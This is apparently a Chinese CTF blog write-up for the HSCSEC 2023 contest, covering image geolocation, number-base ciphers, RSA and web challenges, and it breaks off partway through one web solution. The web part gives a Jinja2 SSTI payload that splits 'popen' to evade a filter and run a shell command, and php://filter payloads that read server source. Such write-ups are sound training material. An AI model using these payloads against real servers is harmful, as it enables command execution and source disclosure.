<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> CTF</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">CTF</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['欢迎来到f14g的博客', '临渊羡鱼，不如退而结网', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-HSCSEC-红客突击队-2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/"
    >HSCSEC-红客突击队-2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/" class="article-date">
  <time datetime="2023-02-13T06:32:52.000Z" itemprop="datePublished">2023-02-13</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</span><br><span class="line"></span><br><span class="line">本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。</span><br><span class="line"></span><br><span class="line">Rank: 31</span><br></pre></td></tr></table></figure>



<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h2><p>百度搜索阿勒泰市第十三届元宵灯会</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112151940.png" alt="image-20230211112151940"></p>
<p>在阿勒泰市五百里风情街举办</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211112308268.png" alt="image-20230211112308268"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211113109127.png" alt="image-20230211113109127"></p>
<p>所以HSCSEC{新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街}</p>
<h2 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/boat.png" alt="boat"></p>
<p>通过百度搜索得到这是在西湖拍的照片</p>
<p>然后搜索西湖的具体位置</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211114001758.png" alt="image-20230211204617988"></p>
<p>HSCSEC{浙江省杭州市西湖区龙井路1号}</p>
<h2 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h2><p>通过百度识图得</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112221530.png" alt="image-20230212112221530"></p>
<p>然后搜索西单大悦城</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112321745.png" alt="image-20230212112321745"></p>
<p>HSCSEC{北京市西城区西单北大街131号}</p>
<h2 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212112540058.png" alt="image-20230212112540058"></p>
<p>可以隐约看到风机型号应该是B-30EL百度</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113106096.png" alt="image-20230212113106096"></p>
<p>发现是渝兴线上的   重庆到北京大兴机场的</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113226575.png" alt="image-20230212113226575"></p>
<p>与飞机的俯瞰图有相同的地方</p>
<p>HSCSEC{北京市大兴区大兴国际机场}</p>
<h2 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113717456.png" alt="image-20230212113717456"></p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212113801024.png" alt="image-20230212113801024"></p>
<p>河北省张家口市怀来县的官厅水库国家湿地公园</p>
<p>HSCSEC{河北省张家口市怀来县官厅水库国家湿地公园}</p>
<h2 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/Tower.jpg" alt="Tower"></p>
<p>通过百度识图得这是澳门巴黎塔</p>
<p>然后高德搜索具体位置</p>
<p>HSCSEC{澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人}</p>
<h2 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142744556.png" alt="image-20230213142744556"></p>
<p>可以看到宁夏理工学院百度搜宁夏理工学院的湖的具体位置</p>
<p>HSCSEC{宁夏回族自治区石嘴山市大武口区星海湖}</p>
<h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h2 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这应该是八卦图和一个空字组成的一种进制数  因为一共有九个符号所以应该是九进制的数</span></span><br><span class="line"><span class="comment">#☲☵这两个符号应该是H的ASCII码的值72，又因为九进制的80等于十进制的72，所以☲:8,☵:0</span></span><br><span class="line"><span class="comment">#☷☵☳这三个符号应该是S的ASCII码值83,又因为九进制的102等于十进制的83，所以☷:1,☳:2</span></span><br><span class="line"><span class="comment">#☶空这两个符号应该是C的ASCII码值67，又因为九进制的74等于十进制的67，所以☶:7,空:4</span></span><br><span class="line"><span class="comment">#☷空☱这三个符号应该是&#123;的ASCII码值123，又因为九进制的146等于十进制的123，所以☱:6</span></span><br><span class="line"><span class="comment">#还剩3和5 ☰ ☴ 要么 ☴:3 要么☴:5</span></span><br><span class="line">c=<span class="string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="string">&#x27;☵&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;☷&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;☳&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;☴&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;空&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;☰&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;☱&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;☶&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;☲&#x27;</span>:<span class="string">&#x27;8&#x27;</span>&#125;      <span class="comment">#正确的</span></span><br><span class="line"><span class="comment"># dict=&#123;&#x27;☵&#x27;:&#x27;0&#x27;,&#x27;☷&#x27;:&#x27;1&#x27;,&#x27;☳&#x27;:&#x27;2&#x27;,&#x27;☰&#x27;:&#x27;3&#x27;,&#x27;空&#x27;:&#x27;4&#x27;,&#x27;☴&#x27;:&#x27;5&#x27;,&#x27;☱&#x27;:&#x27;6&#x27;,&#x27;☶&#x27;:&#x27;7&#x27;,&#x27;☲&#x27;:&#x27;8&#x27;&#125;    #错误的</span></span><br><span class="line">c0=c.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        m += <span class="built_in">dict</span>.get(j)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(m,<span class="number">9</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;Chinese_g0ssp&#125;  发现少个i手动加上   HSCSEC&#123;Chinese_g0ssip&#125;</span></span><br></pre></td></tr></table></figure>





<h2 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h2><p>通过搜索得到二十八星宿，又分为青龙，白虎，朱雀，玄武四大类每一类可以看成相同的一个数字</p>
<p>则这四类可以组成一个四进制的数字</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230211220246475.png" alt="image-20230211220246475"></p>
<p>要把   壁水獝  改为   壁水貐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">qinglong=<span class="string">&#x27;角木蛟 亢金龙 氐土貉 房日兔 心月狐 尾火虎 箕水豹&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">zuque=<span class="string">&#x27;井木犴 鬼金羊 柳土獐 星日马 张月鹿 翼火蛇 轸水蚓&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">xuanwu=<span class="string">&#x27;斗木獬 牛金牛 女土蝠 虚日鼠 危月燕 室火猪 壁水貐&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">baihu=<span class="string">&#x27;奎木狼 娄金狗 胃土雉 昴日鸡 毕月乌 觜火猴 参水猿&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c=<span class="string">&#x27;&#x27;&#x27;斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴</span></span><br><span class="line"><span class="string">虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐</span></span><br><span class="line"><span class="string">壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马</span></span><br><span class="line"><span class="string">虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓</span></span><br><span class="line"><span class="string">室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐</span></span><br><span class="line"><span class="string">牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌</span></span><br><span class="line"><span class="string">危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐</span></span><br><span class="line"><span class="string">斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡</span></span><br><span class="line"><span class="string">危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴</span></span><br><span class="line"><span class="string">牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎</span></span><br><span class="line"><span class="string">室火猪鬼金羊柳土獐壁水貐&#x27;&#x27;&#x27;</span></span><br><span class="line">c0=c.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c0:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m.append(i[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> m:     <span class="comment">#这里不知道谁代表0，1，2，3 利用枚举尝试看那种组合可以得到正确结果</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> qinglong:</span><br><span class="line">            flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> zuque:</span><br><span class="line">            flag+=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> xuanwu:</span><br><span class="line">            flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">in</span> baihu:</span><br><span class="line">            flag+=<span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag,<span class="number">4</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># import gmpy2</span></span><br><span class="line"><span class="comment"># from flag import m</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># print(&#x27;n =&#x27;,n)</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># M = m * e * 1 * 2022 * p</span></span><br><span class="line"><span class="comment"># c = pow(M,e,n)</span></span><br><span class="line"><span class="comment"># print(&#x27;c =&#x27;,c)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=<span class="number">97772803605372749682605407399511947369112121674469942228369880617973442071629696563167801242512592723590571045910500244994517647412843880814748689241502769894657207751011999959509916975918486841422622984629059948050450554202252225537996289481828075394484142212703142883528182761865502541887744555480640923169</span></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m//<span class="number">2022</span>//e//p)))</span><br><span class="line"><span class="comment">#flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #!/bin/python3</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import bytes_to_long, getPrime</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># FLAG = &quot;*******************MASK****************&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # print(FLAG)</span></span><br><span class="line"><span class="comment"># number1 = getPrime(512)</span></span><br><span class="line"><span class="comment"># number2 = getPrime(1024)</span></span><br><span class="line"><span class="comment"># print(number1)</span></span><br><span class="line"><span class="comment"># result = FLAG * number1 % number2</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">number1=<span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">result=<span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line">m=result//number1</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;qMmZqWvmj70bBsCfmVLT&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import flag</span></span><br><span class="line"><span class="comment"># alphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line"><span class="comment"># key = &#x27;HSC&#x27;</span></span><br><span class="line"><span class="comment"># assert flag.startswith(&#x27;HSCSEC&#123;&#x27;)</span></span><br><span class="line"><span class="comment"># flag_num_list = []</span></span><br><span class="line"><span class="comment"># c = []</span></span><br><span class="line"><span class="comment"># for item in flag:</span></span><br><span class="line"><span class="comment">#     flag_num_list.append(alphabet.find(item) + 1)</span></span><br><span class="line"><span class="comment"># key_num = alphabet.find(key) + 1</span></span><br><span class="line"><span class="comment"># for i in flag_num_list:</span></span><br><span class="line"><span class="comment">#     m = (i + key_num) % 94 - 1</span></span><br><span class="line"><span class="comment">#     if m == 0:</span></span><br><span class="line"><span class="comment">#         c.append(&quot;□&quot;)</span></span><br><span class="line"><span class="comment">#     c.append(alphabet[m-1:m])</span></span><br><span class="line"><span class="comment"># print(&quot;c = &#123;&#125;&quot;.format(&#x27;&#x27;.join(c)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(key_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    m=alphabet.find(i) + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(alphabet[m],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h2><p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132309050.png" alt="image-20230212132309050"></p>
<p>进行到这一步的时候发现页面中显示  说明把popen和flag给过滤了</p>
<p>popen可以利用字符拼接绕过  flag可以通过 sort  fl*实现绕过</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230212132617954.png" alt="image-20230212132617954"></p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;pop&quot;&quot;en&quot;](&#x27;sort /fl*&#x27;).read()&#125;&#125;                             </span><br></pre></td></tr></table></figure>

<p>HSCSEC{9a288ab6-fd07-48e9-981c-9badd98ae5a9}</p>
<p>或者tplmap</p>
<p><img src="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/image-20230213142355361.png" alt="image-20230213142355361"></p>
<h2 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h2><p>赛后看了大佬WP才看懂</p>
<p>首先就是利用php伪协议和base大小写绕过来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=upload.php</span><br><span class="line">?acti0n=php://filter/read=convert.bAse64-encode/resource=view.php</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 